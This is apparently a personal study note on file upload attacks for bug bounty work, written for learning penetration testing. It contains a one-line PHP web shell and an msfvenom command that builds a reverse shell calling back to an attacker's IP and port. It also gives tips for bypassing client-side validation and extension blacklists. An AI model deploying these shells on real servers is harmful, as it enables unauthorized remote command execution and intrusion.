---
{"dg-publish":true,"permalink":"/cybersecurity/bug-bounties/file-upload-attacks/"}
---

# Intro to File Upload Attacks

File uploads allow social media users (etc.) to store their images and files corporate websites but also present a serious potential atack vector.

## Types of File upload Attacks

The most basic vulnerability is when the server allows file upload without any kind of validation filters.

If there is no validation and no protection it's easy toupload a Web Shell Script or a Reverse Shell script.

## Identifying the Web Framework

To upload a malicious script, we must first identify the backend technology running the server.

Often this can be done by looking at the extension on the /index.ext page.

We may need to fuzz it if the index is hidden.  We can use **Burp Intruder** for fuzzing or **Wappalyzer** browser extension.

## Upload Exploitation

### Web Shells

There are multiple webshells provided by [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Web-Shells) and there is also [phpbash](https://github.com/Arrexel/phpbash)

Custom web shell:
```php
<?php system($_REQUEST['cmd']); ?>
```

Web shells can exist for any web framework, the difference is the command.

### Reverse Shell

[Pentestmonkey Reverse PHP Shell](https://github.com/pentestmonkey/php-reverse-shell)

### Generating Custom Reverse Shell Scripts

msfvenom can generate many reverse shell scripts in many languages.

```shell-session
User@Comp $ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
...SNIP...
Payload size: 3033 bytes
```

### Client Side Validation

You can tell the difference between front and back end validation by determining whether the browser refreshes.

If the system just uses client-side validation, the protection can be circumvented using Burpsuite to modify the request.

Also, you can look to remove the validation function from the current copy of the website in your client.  Ctl+Shift+K opens up the inspector.  Then find the function that is doing the validation and try and remove it.

## Blacklist Filters

Commone exploitation extensions may be blacklisted on the back end.

### Blacklisting Extensions

There are to common forms of validating.  Testing against a **blacklist** or testing against a **whitelist.**

When we run up against an extension blacklist (or whitelist) the first step is to fuzz the upload function with a list of potential extensions to see which return errors and which return a different message.

Seclist of common **Web Extesions** is good for this.

Use the Burp Intruder for fuzzing the upload request file extension.

